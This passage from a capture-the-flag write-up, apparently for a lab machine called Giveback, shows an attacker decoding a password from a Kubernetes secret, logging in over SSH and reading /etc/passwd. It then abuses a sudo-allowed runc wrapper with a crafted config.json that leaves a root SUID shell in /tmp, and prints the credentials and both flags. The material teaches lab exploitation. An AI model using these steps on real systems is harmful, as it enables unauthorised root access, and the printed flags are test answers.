            "apiVersion": "v1",
            "time": "2025-11-01T19:32:48Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:MASTERPASS": {}
              },
              "f:metadata": {
                "f:ownerReferences": {
                  ".": {},
                  "k:{\"uid\":\"989f4806-6c06-4f13-9b3f-26fe918f3a48\"}": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "MASTERPASS": "REEzR05Dcm5BM3d5ZTB2QURxMGs0bjV3YnBJc2ZnNg=="
      },
      "type": "Opaque"
    }
  ]
}
```

The output showed us `Base64` encoded `Passwords` for `MariaDB` instance and for a user called `babywyrm`. Like the one we saw on the website earlier.

```shell
┌──(kali㉿kali)-[~]
└─$ echo "REEzR05Dcm5BM3d5ZTB2QURxMGs0bjV3YnBJc2ZnNg==" | base64 -d
DA3GNCrnA3wye0vADq0k4n5wbpIsfg6
```

| Use      | Password                         |
| -------- | -------------------------------- |
| MariaDB  | c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T |
| babywyrm | DA3GNCrnA3wye0vADq0k4n5wbpIsfg6  |

With the decoded `Password` we were able to login via `SSH` and to grab the `user.txt`.

```shell
┌──(kali㉿kali)-[~]
└─$ ssh babywyrm@giveback.htb
The authenticity of host 'giveback.htb (10.129.70.248)' can't be established.
ED25519 key fingerprint is SHA256:QW0UEukNwOzzXzOIYR311JYiuhYUEv8FYbRgwiKZ35g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'giveback.htb' (ED25519) to the list of known hosts.
babywyrm@giveback.htb's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Nov 1 22:49:12 2025 from 10.10.16.97
babywyrm@giveback:~$
```

## user.txt

```shell
babywyrm@giveback:~$ cat user.txt 
9b662f447d73f9d9eb6dd3c7d72eb67f
```

## Enumeration (babywyrm)

Now as the user `babywyrm` we checked our `group memberships` real quick and looked for any additional users within the `/etc/passwd`.

```shell
babywyrm@giveback:~$ id
uid=1000(babywyrm) gid=1000(babywyrm) groups=1000(babywyrm),4(adm),30(dip)
```

```shell
babywyrm@giveback:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
babywyrm:x:1000:1000:babywyrm:/home/babywyrm:/bin/bash
_laurel:x:999:998::/var/log/laurel:/bin/false
```

When we listed our privileges for `sudo` we saw that we were allowed to execute a binary called `debug` within `/opt/`.

```shell
babywyrm@giveback:~$ sudo -l
Matching Defaults entries for babywyrm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, timestamp_timeout=0, timestamp_timeout=20

User babywyrm may run the following commands on localhost:
    (ALL) NOPASSWD: !ALL
    (ALL) /opt/debug
```

However, we were not allowed to deal with the file in any regard.

```shell
babywyrm@giveback:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Nov 23  2024 .
drwxr-xr-x 20 root root 4096 Oct  3 16:21 ..
drwx--x--x  4 root root 4096 Oct 10  2024 containerd
-rwx------  1 root root 1037 Nov 22  2024 debug
```

And so we execute it to see what the output would look like. It asked us first for the password of our user but then it needed an `administrative password`.

```shell
babywyrm@giveback:~$ sudo /opt/debug
[sudo] password for babywyrm: 
Validating sudo...
Please enter the administrative password:
```

After quite some time and testing various passwords we gathered along the way we just inserted the `encoded password` of the `MariaDB` instance and it got accepted!

| Password                         |
| -------------------------------- |
| c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T |

```shell
babywyrm@giveback:~$ sudo /opt/debug
Validating sudo...
Please enter the administrative password: 

Both passwords verified. Executing the command...
NAME:
   runc - Open Container Initiative runtime

runc is a command line client for running applications packaged according to
the Open Container Initiative (OCI) format and is a compliant implementation of the
Open Container Initiative specification.

runc integrates well with existing process supervisors to provide a production
container runtime environment for applications. It can be used with your
existing process monitoring tools and the container will be spawned as a
direct child of the process supervisor.

Containers are configured using bundles. A bundle for a container is a directory
that includes a specification file named "config.json" and a root filesystem.
The root filesystem contains the contents of the container.

To start a new instance of a container:

    # runc run [ -b bundle ] <container-id>

Where "<container-id>" is your name for the instance of the container that you
are starting. The name you provide for the container instance must be unique on
your host. Providing the bundle directory using "-b" is optional. The default
value for "bundle" is the current directory.

USAGE:
   runc.amd64.debug [global options] command [command options] [arguments...]

VERSION:
   1.1.11
commit: v1.1.11-0-g4bccb38c
spec: 1.0.2-dev
go: go1.20.12
libseccomp: 2.5.4

COMMANDS:
   checkpoint  checkpoint a running container
   create      create a container
   delete      delete any resources held by the container often used with detached container
   events      display container events such as OOM notifications, cpu, memory, and IO usage statistics
   exec        execute new process inside the container
   kill        kill sends the specified signal (default: SIGTERM) to the container's init process
   list        lists containers started by runc with the given root
   pause       pause suspends all processes inside the container
   ps          ps displays the processes running inside a container
   restore     restore a container from a previous checkpoint
   resume      resumes all processes that have been previously paused
   run         create and run a container
   spec        create a new specification file
   start       executes the user defined process in a created container
   state       output the state of a container
   update      update container resource constraints
   features    show the enabled features
   help, h     Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --debug             enable debug logging
   --log value         set the log file to write runc logs to (default is '/dev/stderr')
   --log-format value  set the log format ('text' (default), or 'json') (default: "text")
   --root value        root directory for storage of container state (this should be located in tmpfs) (default: "/run/runc")
   --criu value        path to the criu binary used for checkpoint and restore (default: "criu")
   --systemd-cgroup    enable systemd cgroup support, expects cgroupsPath to be of form "slice:prefix:name" for e.g. "system.slice:runc:434234"
   --rootless value    ignore cgroup permission errors ('true', 'false', or 'auto') (default: "auto")
   --help, -h          show help
   --version, -v       print the version
```

## Privilege Escalation to root

### Abusing sudo Misconfiguration

With this information in our pockets the way for `Privilege Escalation` to `root` was clear. We needed to create a custom `configuration file` that would execute whatever command we entered when the `container` got build.

```shell
babywyrm@giveback:/tmp$ mkdir mycontainer
```

```shell
babywyrm@giveback:/tmp$ cd mycontainer/
```

```shell
babywyrm@giveback:/tmp/mycontainer$ mkdir rootfs
```

```shell
babywyrm@giveback:/tmp/mycontainer$ cat config.json 
{
  "ociVersion": "1.0.2",
  "process": {
    "user": {
      "uid": 0,
      "gid": 0
    },
    "args": [
      "/bin/bash",
      "-c",
      "cp /bin/bash /tmp/rootshell && chmod 4777 /tmp/rootshell && echo 'SUID shell created at /tmp/rootshell' > /tmp/status.txt"
    ],
    "cwd": "/",
    "env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "TERM=xterm"
    ],
    "terminal": false
  },
  "root": {
    "path": "rootfs",
    "readonly": false
  },
  "mounts": [
    {
      "destination": "/proc",
      "type": "proc",
      "source": "proc"
    },
    {
      "destination": "/dev",
      "type": "tmpfs",
      "source": "tmpfs",
      "options": ["nosuid", "strictatime", "mode=755", "size=65536k"]
    },
    {
      "destination": "/bin",
      "type": "bind",
      "source": "/bin",
      "options": ["bind", "ro"]
    },
    {
      "destination": "/lib",
      "type": "bind",
      "source": "/lib",
      "options": ["bind", "ro"]
    },
    {
      "destination": "/lib64",
      "type": "bind",
      "source": "/lib64",
      "options": ["bind", "ro"]
    },
    {
      "destination": "/usr",
      "type": "bind",
      "source": "/usr",
      "options": ["bind", "ro"]
    },
    {
      "destination": "/tmp",
      "type": "bind",
      "source": "/tmp",
      "options": ["bind", "rw"]
    },
    {
      "destination": "/root",
      "type": "bind",
      "source": "/root",
      "options": ["bind", "rw"]
    }
  ],
  "linux": {
    "namespaces": [
      {"type": "pid"},
      {"type": "network"},
      {"type": "ipc"},
      {"type": "uts"},
      {"type": "mount"}
    ]
  }
}
```

| Password                         |
| -------------------------------- |
| c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T |

After we put together the `config.json` we simply started our `container` within `/tmp/` and got granted a `rootshell` binary with an `SUID` bit set on it.

```shell
babywyrm@giveback:/tmp/mycontainer$ sudo /opt/debug run mycontainer
Validating sudo...
Please enter the administrative password: 

Both passwords verified. Executing the command...
```

```shell
babywyrm@giveback:/tmp/mycontainer$ ls -la /tmp
total 1420
drwxrwxrwt 13 root     root        4096 Nov  2 08:00 .
drwxr-xr-x 20 root     root        4096 Oct  3 16:21 ..
drwxrwxrwt  2 root     root        4096 Nov  2 07:47 .ICE-unix
drwxrwxrwt  2 root     root        4096 Nov  2 07:47 .Test-unix
drwxrwxrwt  2 root     root        4096 Nov  2 07:47 .X11-unix
drwxrwxrwt  2 root     root        4096 Nov  2 07:47 .XIM-unix
drwxrwxrwt  2 root     root        4096 Nov  2 07:47 .font-unix
drwxrwxr-x  3 babywyrm babywyrm    4096 Nov  2 08:00 mycontainer
-rwsrwxrwx  1 root     root     1396520 Nov  2 08:00 rootshell
-rw-r--r--  1 root     root          37 Nov  2 08:00 status.txt
drwx------  3 root     root        4096 Nov  2 07:47 systemd-private-0df476c0b78e4e77b3c1a3ddd6a0eadd-systemd-logind.service-bGWVf7
drwx------  3 root     root        4096 Nov  2 07:47 systemd-private-0df476c0b78e4e77b3c1a3ddd6a0eadd-systemd-resolved.service-RAtvl7
drwx------  3 root     root        4096 Nov  2 07:47 systemd-private-0df476c0b78e4e77b3c1a3ddd6a0eadd-systemd-timesyncd.service-KB067H
drwx------  2 root     root        4096 Nov  2 07:47 vmware-root
drwx------  2 root     root        4096 Nov  2 07:48 vmware-root_3895-2117547279
```

```shell
babywyrm@giveback:/tmp/mycontainer$ /tmp/rootshell -p
rootshell-5.1# 
```

## root.txt

```shell
rootshell-5.1# cat root.txt
08e86fb5d4821ed0d52621257c0e5705
```
